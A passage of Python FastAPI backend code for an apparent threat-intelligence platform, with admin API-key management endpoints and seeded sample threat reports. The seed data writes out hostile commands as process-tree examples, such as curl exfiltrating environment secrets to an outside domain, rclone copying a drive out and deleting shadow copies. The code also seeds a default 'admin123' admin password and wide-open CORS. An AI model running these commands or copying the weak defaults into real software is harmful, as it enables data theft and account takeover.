class CommunitySourcesUpdate(BaseModel):
    enabled: list[str]


@api_router.get("/admin/settings")
async def admin_settings_list(user: dict = Depends(get_current_user)):
    """Return all managed settings (API keys masked, community source toggles)."""
    docs = await db.app_settings.find({}).to_list(100)
    by_key = {d.get("key"): d for d in docs}
    keys_out = []
    for spec in API_KEY_SETTINGS:
        db_doc = by_key.get(spec["name"])
        db_val = (db_doc or {}).get("value") if db_doc else None
        env_val = os.environ.get(spec["name"])
        effective = db_val or env_val
        source = "db" if db_val else ("env" if env_val else "missing")
        active_tier = (db_doc or {}).get("active_tier")  # 'enterprise' | 'free' | None
        entry = {
            "name": spec["name"],
            "label": spec["label"],
            "desc": spec["desc"],
            "get_url": spec["get_url"],
            "masked": _mask_key(effective) if effective else "",
            "source": source,
            "updated_at": (db_doc or {}).get("updated_at"),
            "updated_by": (db_doc or {}).get("updated_by"),
        }
        # Enterprise/Free tier metadata for eligible keys.
        if spec["name"] in ENTERPRISE_ELIGIBLE:
            ent_doc = by_key.get(f"{spec['name']}__ENTERPRISE")
            free_doc = by_key.get(f"{spec['name']}__FREE")
            sync_meta = by_key.get(f"{spec['name']}__ENTERPRISE_SYNC_META") or {}
            entry["tier_supported"] = True
            entry["active_tier"] = active_tier or ("enterprise" if effective and ent_doc and ent_doc.get("value") == effective else ("free" if effective and free_doc and free_doc.get("value") == effective else None))
            entry["enterprise_masked"] = _mask_key((ent_doc or {}).get("value") or "")
            entry["free_masked"] = _mask_key((free_doc or {}).get("value") or "")
            entry["last_enterprise_sync"] = {
                "started_at": sync_meta.get("last_started_at"),
                "finished_at": sync_meta.get("last_finished_at"),
                "duration_ms": sync_meta.get("last_duration_ms"),
                "ok": sync_meta.get("last_ok"),
                "by": sync_meta.get("last_by"),
                "vt_added": sync_meta.get("last_vt_added"),
                "talos_added": sync_meta.get("last_talos_added"),
            } if sync_meta else None
        keys_out.append(entry)
    enabled_sources = await _get_enabled_community_sources()
    return {
        "api_keys": keys_out,
        "community_sources": {"available": COMMUNITY_SOURCES, "enabled": enabled_sources},
    }


@api_router.put("/admin/settings/api-key/{name}")
async def admin_settings_upsert_key(name: str, payload: ApiKeyUpdate, user: dict = Depends(get_current_user)):
    if name not in _API_KEY_INDEX:
        raise HTTPException(status_code=404, detail=f"Unknown key: {name}")
    value = (payload.value or "").strip()
    if not value:
        raise HTTPException(status_code=400, detail="Value must not be empty. Use DELETE to clear an override.")
    now_iso_ts = datetime.now(timezone.utc).isoformat()
    await db.app_settings.update_one(
        {"key": name},
        {"$set": {"key": name, "value": value, "updated_at": now_iso_ts, "updated_by": user.get("email")}},
        upsert=True,
    )
    # Append to history (dedupe if identical to the most recent entry to keep the log tidy).
    last = await db.api_key_history.find_one({"key_name": name}, sort=[("applied_at", -1)])
    if not last or last.get("value") != value:
        await db.api_key_history.insert_one({
            "key_name": name,
            "value": value,
            "applied_at": now_iso_ts,
            "applied_by": user.get("email"),
        })
    await _load_settings_from_db()  # apply live
    # Auto-fire the matching bulk-IOC sync in the background so the new key
    # immediately pulls fresh data without the admin having to click "Sync".
    _fire_sync_for_key(name)
    return {"ok": True, "masked": _mask_key(value), "source": "db", "sync_triggered": name in _KEY_SYNC_MAP}


@api_router.get("/admin/settings/api-key/{name}/history")
async def admin_settings_key_history(name: str, user: dict = Depends(get_current_user)):
    """Return the last 20 previously-applied values for this key (masked)."""
    if name not in _API_KEY_INDEX:
        raise HTTPException(status_code=404, detail=f"Unknown key: {name}")
    docs = await db.api_key_history.find({"key_name": name}).sort("applied_at", -1).limit(20).to_list(20)
    current = globals().get(_API_KEY_INDEX[name]["global_var"]) or ""
    return {
        "history": [
            {
                "id": str(d["_id"]),
                "masked": _mask_key(d.get("value", "")),
                "applied_at": d.get("applied_at"),
                "applied_by": d.get("applied_by"),
                "is_current": (d.get("value") == current),
            }
            for d in docs
        ]
    }


@api_router.post("/admin/settings/api-key/{name}/apply-history/{history_id}")
async def admin_settings_apply_history(name: str, history_id: str, user: dict = Depends(get_current_user)):
    """Re-apply a previously-used key value to become the active one."""
    if name not in _API_KEY_INDEX:
        raise HTTPException(status_code=404, detail=f"Unknown key: {name}")
    try:
        oid = ObjectId(history_id)
    except Exception:
        raise HTTPException(status_code=400, detail="Invalid history id")
    doc = await db.api_key_history.find_one({"_id": oid, "key_name": name})
    if not doc:
        raise HTTPException(status_code=404, detail="History entry not found")
    value = doc.get("value") or ""
    now_iso_ts = datetime.now(timezone.utc).isoformat()
    await db.app_settings.update_one(
        {"key": name},
        {"$set": {"key": name, "value": value, "updated_at": now_iso_ts, "updated_by": user.get("email")}},
        upsert=True,
    )
    # Log the re-apply as a new history entry so the timeline stays accurate.
    await db.api_key_history.insert_one({
        "key_name": name,
        "value": value,
        "applied_at": now_iso_ts,
        "applied_by": user.get("email"),
        "note": f"re-applied from {doc.get('applied_at')}",
    })
    await _load_settings_from_db()
    _fire_sync_for_key(name)
    return {"ok": True, "masked": _mask_key(value), "source": "db", "sync_triggered": name in _KEY_SYNC_MAP}


@api_router.post("/admin/settings/api-key/{name}/sync")
async def admin_settings_manual_sync(name: str, user: dict = Depends(get_current_user)):
    """Manually trigger the bulk-IOC sync tied to a specific provider key.
    Runs inline so the admin gets the summary back in the response."""
    if name not in _API_KEY_INDEX:
        raise HTTPException(status_code=404, detail=f"Unknown key: {name}")
    m = _KEY_SYNC_MAP.get(name)
    if not m:
        return {"ok": False, "reason": "no_sync_available", "message": f"{name} has no bulk IOC feed to sync (used only for on-demand lookups)."}
    label, fn_name = m
    fn = globals().get(fn_name)
    if not fn:
        return {"ok": False, "reason": "sync_fn_missing", "message": f"Sync function {fn_name} not available."}
    try:
        result = await fn()
        return {"ok": True, "source": label, "result": result}
    except Exception as e:
        logger.error(f"Manual sync failed for {name}: {e}")
        raise HTTPException(status_code=502, detail=f"Sync failed: {e}")


@api_router.delete("/admin/settings/api-key/{name}")
async def admin_settings_clear_key(name: str, user: dict = Depends(get_current_user)):
    if name not in _API_KEY_INDEX:
        raise HTTPException(status_code=404, detail=f"Unknown key: {name}")
    await db.app_settings.delete_one({"key": name})
    await _load_settings_from_db()  # revert to .env
    env_val = os.environ.get(name)
    return {"ok": True, "source": "env" if env_val else "missing", "masked": _mask_key(env_val) if env_val else ""}


@api_router.post("/admin/settings/api-key/{name}/test")
async def admin_settings_test_key(name: str, user: dict = Depends(get_current_user)):
    if name not in _API_KEY_INDEX:
        raise HTTPException(status_code=404, detail=f"Unknown key: {name}")
    spec = _API_KEY_INDEX[name]
    effective = globals().get(spec["global_var"])
    result = await _test_api_key(name, effective or "")
    return result


# ---------------------------------------------------------------------------
# Enterprise/Free tier storage — user pastes both keys once; the "Monthly
# Enterprise Sync" button temporarily swaps in the Enterprise key, runs the
# VT + Talos-community bulk sync, then automatically reverts to the Free key
# so premium credits are only spent during the actual sync window.
# Currently applicable to VIRUSTOTAL_API_KEY. Enterprise sync also runs the
# Talos-community feeds during the same window.
# ---------------------------------------------------------------------------
ENTERPRISE_ELIGIBLE = {"VIRUSTOTAL_API_KEY"}


class TierValue(BaseModel):
    value: str


@api_router.put("/admin/settings/api-key/{name}/tier/{tier}")
async def admin_settings_upsert_tier(name: str, tier: str, payload: TierValue, user: dict = Depends(get_current_user)):
    if name not in ENTERPRISE_ELIGIBLE:
        raise HTTPException(status_code=400, detail=f"{name} does not support Enterprise/Free tiers")
    if tier not in ("enterprise", "free"):
        raise HTTPException(status_code=400, detail="tier must be 'enterprise' or 'free'")
    value = (payload.value or "").strip()
    if not value:
        raise HTTPException(status_code=400, detail="Value must not be empty")
    doc_id = f"{name}__{tier.upper()}"
    now_ts = datetime.now(timezone.utc).isoformat()
    await db.app_settings.update_one(
        {"key": doc_id},
        {"$set": {"key": doc_id, "value": value, "updated_at": now_ts, "updated_by": user.get("email")}},
        upsert=True,
    )
    # If a Free tier value is being saved and no active override exists, promote it
    # to be the currently-active key so the app doesn't sit idle waiting.
    if tier == "free":
        active = await db.app_settings.find_one({"key": name})
        if not active:
            await db.app_settings.update_one(
                {"key": name},
                {"$set": {"key": name, "value": value, "updated_at": now_ts, "updated_by": user.get("email"), "active_tier": "free"}},
                upsert=True,
            )
            await _load_settings_from_db()
    return {"ok": True, "tier": tier, "masked": _mask_key(value)}


async def _read_tier_value(name: str, tier: str) -> Optional[str]:
    doc = await db.app_settings.find_one({"key": f"{name}__{tier.upper()}"})
    return (doc or {}).get("value")


async def _set_active_key(name: str, value: str, tier: str, user_email: Optional[str]) -> None:
    """Swap the currently-active value used by _load_settings_from_db."""
    now_ts = datetime.now(timezone.utc).isoformat()
    await db.app_settings.update_one(
        {"key": name},
        {"$set": {"key": name, "value": value, "updated_at": now_ts, "updated_by": user_email, "active_tier": tier}},
        upsert=True,
    )
    await _load_settings_from_db()


@api_router.post("/admin/settings/enterprise-sync")
async def admin_settings_enterprise_sync(user: dict = Depends(get_current_user)):
    """Monthly Enterprise Sync — atomically swap VT to Enterprise key, run VT
    Enterprise + Talos-community bulk syncs, then revert to Free. Returns a
    detailed timeline the admin can audit."""
    name = "VIRUSTOTAL_API_KEY"
    enterprise = await _read_tier_value(name, "enterprise")
    free = await _read_tier_value(name, "free")
    if not enterprise:
        raise HTTPException(status_code=400, detail="Enterprise key not configured. Save it in Admin → Settings → VirusTotal → Enterprise tier first.")

    started_at = datetime.now(timezone.utc)
    timeline: list[dict] = [{"step": "start", "at": started_at.isoformat(), "tier_before": "unknown"}]
    original_doc = await db.app_settings.find_one({"key": name})
    original_value = (original_doc or {}).get("value")
    original_tier = (original_doc or {}).get("active_tier") or ("free" if original_value == free else "unknown")

    try:
        # Step 1: swap in Enterprise
        await _set_active_key(name, enterprise, "enterprise", user.get("email"))
        timeline.append({"step": "swap_to_enterprise", "at": datetime.now(timezone.utc).isoformat()})

        # Step 2: run VT Enterprise + Talos syncs in parallel
        vt_task = _sync_virustotal_intel()
        talos_task = _sync_talos_blocklist()
        vt_res, talos_res = await asyncio.gather(vt_task, talos_task, return_exceptions=True)
        vt_result = {"error": str(vt_res)} if isinstance(vt_res, Exception) else vt_res
        talos_result = {"error": str(talos_res)} if isinstance(talos_res, Exception) else talos_res
        timeline.append({"step": "sync_complete", "at": datetime.now(timezone.utc).isoformat(), "vt": vt_result, "talos": talos_result})
    finally:
        # Step 3: ALWAYS revert to Free (or previous value) — even if syncs errored
        revert_val = free or original_value
        if revert_val:
            await _set_active_key(name, revert_val, "free" if free else original_tier, user.get("email"))
        else:
            # No free key and no previous → drop DB override entirely (fall back to .env)
            await db.app_settings.delete_one({"key": name})
            await _load_settings_from_db()
        timeline.append({"step": "revert_to_free", "at": datetime.now(timezone.utc).isoformat()})

    finished_at = datetime.now(timezone.utc)
    duration_ms = int((finished_at - started_at).total_seconds() * 1000)

    # Persist "last_successful_enterprise_sync" for the UI
    ok = not (isinstance(vt_res, Exception) or isinstance(talos_res, Exception))
    await db.app_settings.update_one(
        {"key": f"{name}__ENTERPRISE_SYNC_META"},
        {"$set": {
            "key": f"{name}__ENTERPRISE_SYNC_META",
            "last_started_at": started_at.isoformat(),
            "last_finished_at": finished_at.isoformat(),
            "last_duration_ms": duration_ms,
            "last_ok": bool(ok),
            "last_by": user.get("email"),
            "last_vt_added": (vt_result or {}).get("added") if isinstance(vt_result, dict) else None,
            "last_talos_added": (talos_result or {}).get("added") if isinstance(talos_result, dict) else None,
        }},
        upsert=True,
    )

    return {
        "ok": ok,
        "started_at": started_at.isoformat(),
        "finished_at": finished_at.isoformat(),
        "duration_ms": duration_ms,
        "vt": vt_result,
        "talos": talos_result,
        "timeline": timeline,
        "final_tier": "free" if free else original_tier,
    }


@api_router.put("/admin/settings/community-sources")
async def admin_settings_community_sources(payload: CommunitySourcesUpdate, user: dict = Depends(get_current_user)):
    cleaned = [s for s in (payload.enabled or []) if s in _COMMUNITY_SLUGS]
    await db.app_settings.update_one(
        {"key": "COMMUNITY_ENABLED_SOURCES"},
        {"$set": {"key": "COMMUNITY_ENABLED_SOURCES", "value": cleaned, "updated_at": datetime.now(timezone.utc).isoformat(), "updated_by": user.get("email")}},
        upsert=True,
    )
    return {"ok": True, "enabled": cleaned}


@api_router.get("/community/enabled-sources")
async def public_enabled_community_sources():
    """Public endpoint used by the Threat Intelligence page to hide disabled feeds."""
    return {"enabled": await _get_enabled_community_sources()}


app.include_router(api_router)

# CyberLab Decoder & Threat Analysis Platform (modular sub-app)
from cyberlab import router as cyberlab_router  # noqa: E402
from cyberlab.router import admin_router as cyberlab_admin_router  # noqa: E402
from cyberlab import persistence as cyberlab_persistence  # noqa: E402
app.include_router(cyberlab_router)
app.include_router(cyberlab_admin_router)


@app.on_event("startup")
async def _cyberlab_ensure_indexes():
    try:
        await cyberlab_persistence.ensure_indexes()
        logger.info("cyberlab: mongo indexes ensured")
    except Exception as e:
        logger.warning("cyberlab index setup failed: %s", e)


app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)


# ---------------------------------------------------------------------------
# Seeding
# ---------------------------------------------------------------------------
async def seed_admin():
    admin_email = os.environ.get("ADMIN_EMAIL", "admin@nivxmachines.com").lower()
    admin_password = os.environ.get("ADMIN_PASSWORD", "admin123")
    existing = await db.users.find_one({"email": admin_email})
    if existing is None:
        await db.users.insert_one({
            "email": admin_email,
            "password_hash": hash_password(admin_password),
            "name": "NivX Admin",
            "role": "admin",
            "created_at": now_iso(),
        })
        logger.info("Seeded admin user")
    elif not verify_password(admin_password, existing["password_hash"]):
        await db.users.update_one({"email": admin_email}, {"$set": {"password_hash": hash_password(admin_password)}})


SAMPLE_THREATS = [
    {
        "title": "APT41 Supply-Chain Implant via Signed Binary",
        "summary": "State-aligned actor abused a trusted software update channel to deploy a memory-resident implant, establishing C2 over HTTPS beaconing to a fronted domain.",
        "severity": "critical",
        "category": "APT / Supply Chain",
        "threat_actor": "APT41 (Double Dragon)",
        "image_url": "https://images.unsplash.com/photo-1555066931-4365d14bab8c?crop=entropy&cs=srgb&fm=jpg&q=85&w=1200",
        "attack_chain": ["Initial Access", "Execution", "Persistence", "Defense Evasion", "Command & Control", "Exfiltration"],
        "iocs": ["sha256:9f2b...c41a", "domain:cdn-update[.]net", "ip:45.61.136.9"],
        "process_tree": {
            "name": "update.exe", "pid": "4120", "cmd": "update.exe /silent", "malicious": False,
            "children": [
                {"name": "rundll32.exe", "pid": "5188", "cmd": "rundll32 loader.dll,Start", "malicious": True, "children": [
                    {"name": "powershell.exe", "pid": "6012", "cmd": "-enc SQBFAFgA...", "malicious": True, "children": []}
                ]}
            ]
        },
        "source": "NivX Threat Intel",
    },
    {
        "title": "Akira Ransomware Exploiting VPN Zero-Day",
        "summary": "Affiliate leveraged an unpatched VPN appliance to gain a foothold, disabled EDR, and detonated ransomware across the domain within 6 hours of intrusion.",
        "severity": "critical",
        "category": "Ransomware",
        "threat_actor": "Akira",
        "image_url": "https://images.unsplash.com/photo-1644088379091-d574269d422f?crop=entropy&cs=srgb&fm=jpg&q=85&w=1200",
        "attack_chain": ["Initial Access", "Credential Access", "Lateral Movement", "Defense Evasion", "Impact"],
        "iocs": ["sha256:1a77...ff03", "ext:.akira", "ip:185.156.72.14"],
        "process_tree": {
            "name": "svchost.exe", "pid": "980", "cmd": "svchost -k netsvcs", "malicious": False,
            "children": [
                {"name": "cmd.exe", "pid": "2210", "cmd": "vssadmin delete shadows /all", "malicious": True, "children": [
                    {"name": "akira.exe", "pid": "3320", "cmd": "akira.exe -p C:\\", "malicious": True, "children": []}
                ]}
            ]
        },
        "source": "NivX Threat Intel",
    },
    {
        "title": "AI-Generated Phishing Kit Targeting Fintech",
        "summary": "LLM-crafted lures with pixel-perfect cloned login portals harvested MFA tokens via reverse-proxy (AiTM). NivX AI classifier flagged anomalous domain entropy.",
        "severity": "high",
        "category": "Phishing / AiTM",
        "threat_actor": "Storm-1101 (cluster)",
        "image_url": "https://images.unsplash.com/photo-1680992046626-418f7e910589?crop=entropy&cs=srgb&fm=jpg&q=85&w=1200",
        "attack_chain": ["Reconnaissance", "Resource Development", "Initial Access", "Credential Access"],
        "iocs": ["domain:secure-fintech-login[.]com", "url:/auth/relay", "ja3:e7d705a3..."],
        "process_tree": {
            "name": "chrome.exe", "pid": "7788", "cmd": "chrome --app=https://phish", "malicious": False,
            "children": [
                {"name": "relay-proxy", "pid": "8090", "cmd": "evilginx2", "malicious": True, "children": []}
            ]
        },
        "source": "NivX Threat Intel",
    },
    {
        "title": "Scattered Spider Help-Desk Social Engineering",
        "summary": "Threat actor impersonated employees to a service desk, reset MFA, and pivoted to cloud identity provider. NivX identity analytics flagged impossible-travel sign-ins minutes before privilege escalation.",
        "severity": "critical",
        "category": "Identity / Social Engineering",
        "threat_actor": "Scattered Spider (UNC3944)",
        "image_url": "https://images.pexels.com/photos/5380664/pexels-photo-5380664.jpeg?auto=compress&cs=tinysrgb&w=1200",
        "attack_chain": ["Reconnaissance", "Initial Access", "Privilege Escalation", "Lateral Movement", "Collection", "Exfiltration"],
        "iocs": ["ip:104.28.246.11", "email:it-support@nivx-helpdesk[.]com", "ua:Mozilla/5.0 (okta-bypass)"],
        "process_tree": {
            "name": "okta-session", "pid": "-", "cmd": "MFA reset via help desk", "malicious": True,
            "children": [
                {"name": "aws-cli", "pid": "3011", "cmd": "aws sts assume-role", "malicious": True, "children": [
                    {"name": "s3-sync", "pid": "3044", "cmd": "aws s3 sync s3://crown-jewels ./", "malicious": True, "children": []}
                ]}
            ]
        },
        "source": "NivX Threat Intel",
    },
    {
        "title": "LockBit Affiliate Double-Extortion Campaign",
        "summary": "Initial access broker sold RDP creds; affiliate exfiltrated 400GB before encryption. NivX MDR isolated 3 hosts and blocked the exfil channel, containing spread to 4% of the estate.",
        "severity": "critical",
        "category": "Ransomware",
        "threat_actor": "LockBit 3.0 affiliate",
        "image_url": "https://images.pexels.com/photos/60504/security-protection-anti-virus-software-60504.jpeg?auto=compress&cs=tinysrgb&w=1200",
        "attack_chain": ["Initial Access", "Discovery", "Lateral Movement", "Collection", "Exfiltration", "Impact"],
        "iocs": ["sha256:c9d3...81be", "ext:.lockbit", "ip:193.201.9.55", "tool:rclone.exe"],
        "process_tree": {
            "name": "mstsc.exe", "pid": "1120", "cmd": "RDP session (stolen creds)", "malicious": True,
            "children": [
                {"name": "rclone.exe", "pid": "2288", "cmd": "rclone copy C:\\ mega:exfil", "malicious": True, "children": []},
                {"name": "lockbit.exe", "pid": "2290", "cmd": "lockbit -encrypt -spread", "malicious": True, "children": []}
            ]
        },
        "source": "NivX Threat Intel",
    },
    {
        "title": "Malicious npm Package Backdoors CI Pipeline",
        "summary": "A typosquatted dependency executed a postinstall script that exfiltrated CI secrets and planted a build-time backdoor. NivX SCA blocked the package hash across all pipelines.",
        "severity": "high",
        "category": "Supply Chain / DevSecOps",
        "threat_actor": "Unattributed",
        "image_url": "https://images.pexels.com/photos/11035380/pexels-photo-11035380.jpeg?auto=compress&cs=tinysrgb&w=1200",
        "attack_chain": ["Resource Development", "Initial Access", "Execution", "Credential Access", "Exfiltration"],
        "iocs": ["npm:reqwest-utils@1.2.9", "domain:collect-metrics[.]dev", "sha256:44af...9c02"],
        "process_tree": {
            "name": "node", "pid": "512", "cmd": "npm install", "malicious": False,
            "children": [
                {"name": "sh", "pid": "540", "cmd": "node postinstall.js", "malicious": True, "children": [
                    {"name": "curl", "pid": "551", "cmd": "curl -d @/proc/self/environ collect-metrics.dev", "malicious": True, "children": []}
                ]}
            ]
        },
        "source": "NivX Threat Intel",
    },
    {
        "title": "Volt Typhoon Living-off-the-Land in OT Network",
        "summary": "State actor used only built-in tools (LOLBins) to persist in critical-infrastructure OT for months. NivX behavioral analytics surfaced anomalous wmic and netsh usage from a jump host.",
        "severity": "high",
        "category": "APT / Critical Infrastructure",
        "threat_actor": "Volt Typhoon",
        "image_url": "https://images.pexels.com/photos/2881229/pexels-photo-2881229.jpeg?auto=compress&cs=tinysrgb&w=1200",
        "attack_chain": ["Initial Access", "Persistence", "Defense Evasion", "Discovery", "Lateral Movement"],
        "iocs": ["ip:45.32.174.20", "lolbin:wmic.exe", "lolbin:netsh.exe", "cred:cached NTLM"],
        "process_tree": {
            "name": "wmiprvse.exe", "pid": "760", "cmd": "wmic process call create", "malicious": True,
            "children": [
                {"name": "netsh.exe", "pid": "812", "cmd": "netsh interface portproxy add", "malicious": True, "children": []}
            ]
        },
        "source": "NivX Threat Intel",
    },
]


async def seed_threats():
    for t in SAMPLE_THREATS:
        existing = await db.threat_reports.find_one({"title": t["title"]})
        if existing is None:
            report = ThreatReport(**t)
            await db.threat_reports.insert_one(report.model_dump())
    logger.info("Threat reports seeded/verified")


@app.on_event("startup")
async def startup():
    await db.users.create_index("email", unique=True)
    await db.app_settings.create_index("key", unique=True)
    await _load_settings_from_db()  # DB-first override for API keys (survives server migration)
    await seed_admin()
    await seed_threats()
    if OTX_API_KEY:
        asyncio.create_task(_otx_sync_loop())
        logger.info("AlienVault OTX sync loop scheduled (startup + daily)")
    # Bulk-IOC sources (HA/AbuseIPDB/MalwareBazaar/Malwarebytes/VT/Talos) refresh every 2h
    asyncio.create_task(_bulk_ioc_sync_loop())
    logger.info(f"Bulk-IOC sync loop scheduled every {BULK_IOC_SYNC_INTERVAL_SEC//3600}h")


@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
